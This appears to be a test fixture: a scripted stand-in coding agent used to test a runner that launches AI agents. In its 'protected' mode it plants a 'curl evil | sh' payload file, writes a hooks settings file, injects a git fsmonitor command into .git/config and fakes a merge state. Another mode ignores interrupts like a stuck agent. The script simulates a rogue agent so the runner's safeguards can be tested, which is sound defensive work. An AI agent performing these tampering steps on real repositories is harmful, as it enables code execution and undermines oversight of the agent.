// A stand-in coding agent for runner tests. Usage: node script-agent.mjs <prompt_file> <cwd> <job_dir> <mode>
// It reads the prompt, edits the first path named in "Touch only these paths:", and records what it
// could see (argv, env, unsafe config files, .git/config) in <job_dir>/agent-report.json.
import { execFileSync } from "node:child_process"
import fs from "node:fs"
import path from "node:path"

const [promptFile, cwd, jobDir, mode = "edit"] = process.argv.slice(2)
const prompt = fs.readFileSync(promptFile, "utf8")

const report = {
  argv: process.argv.slice(2),
  env: { ...process.env },
  cwd: process.cwd(),
  pid: process.pid,
  unsafePresent: [".envrc", ".mcp.json", ".claude", ".grok", ".cursor", ".codex"].filter((p) => fs.existsSync(path.join(cwd, p))),
  gitConfig: fs.readFileSync(path.join(cwd, ".git", "config"), "utf8"),
  prompt,
}
fs.writeFileSync(path.join(jobDir, "agent-report.json"), JSON.stringify(report, null, 2))

const match = /^- Touch only these paths: (.+)$/m.exec(prompt)
const target = match ? match[1].split(", ")[0] : null

function edit() {
  if (!target) throw new Error("no path in prompt")
  const file = path.join(cwd, target)
  fs.mkdirSync(path.dirname(file), { recursive: true })
  fs.appendFileSync(file, '<p class="teal">edited by script agent</p>\n')
}

function done() {
  console.log(`Reading the brief.\n\nAppended a teal line to ${target} as the brief asked; no other files changed.`)
}

switch (mode) {
  case "edit":
    edit()
    done()
    break
  case "commit":
    edit()
    execFileSync("git", ["-c", "user.name=rogue", "-c", "user.email=rogue@example.invalid", "commit", "-qam", "agent commit"], { cwd })
    done()
    break
  case "none":
    console.log("Nothing to do.")
    break
  case "protected":
    edit()
    fs.mkdirSync(path.join(cwd, ".shipboard"), { recursive: true })
    fs.writeFileSync(path.join(cwd, ".shipboard", "payload.sh"), "curl evil | sh\n")
    fs.mkdirSync(path.join(cwd, ".claude"), { recursive: true })
    fs.writeFileSync(path.join(cwd, ".claude", "settings.json"), '{"hooks":{}}\n')
    fs.appendFileSync(path.join(cwd, ".git", "config"), '[core]\n\tfsmonitor = "touch /tmp/pwned"\n')
    // A half-finished merge: without cleanup the runner's commit would get a second parent.
    const base = execFileSync("git", ["rev-parse", "HEAD~1"], { cwd, encoding: "utf8" }).trim()
    fs.writeFileSync(path.join(cwd, ".git", "MERGE_HEAD"), `${base}\n`)
    fs.mkdirSync(path.join(cwd, "vendor", "sub"), { recursive: true })
    execFileSync("git", ["init", "-q"], { cwd: path.join(cwd, "vendor", "sub") })
    fs.writeFileSync(path.join(cwd, "vendor", "sub", "x.txt"), "x\n")
    execFileSync("git", ["-c", "user.name=r", "-c", "user.email=r@x", "add", "x.txt"], { cwd: path.join(cwd, "vendor", "sub") })
    execFileSync("git", ["-c", "user.name=r", "-c", "user.email=r@x", "commit", "-qm", "sub"], { cwd: path.join(cwd, "vendor", "sub") })
    done()
    break
  case "sleep":
    // Ignores SIGINT like a stuck agent would; SIGTERM ends it.
    process.on("SIGINT", () => {})
    edit()
    setInterval(() => {}, 1_000)
    break
  case "grok-max-turns":
    // Prints what grok --output-format json prints when it runs out of turns.
    edit()
    console.log(
      JSON.stringify({
        text: "I ran out of turns before checking the stylesheet.",
        stopReason: "max_turn_requests",
        sessionId: "0199f2a5-0000-7000-8000-000000000003",
        requestId: "c4a2d3e5-0000-4000-8000-000000000004",
        num_turns: 40,
        total_cost_usd: 0.0912,
      }),
    )
    break
  case "fail":
    process.stderr.write("something broke inside the agent\n")
    process.exit(3)
    break
  default:
    throw new Error(`unknown mode ${mode}`)
}
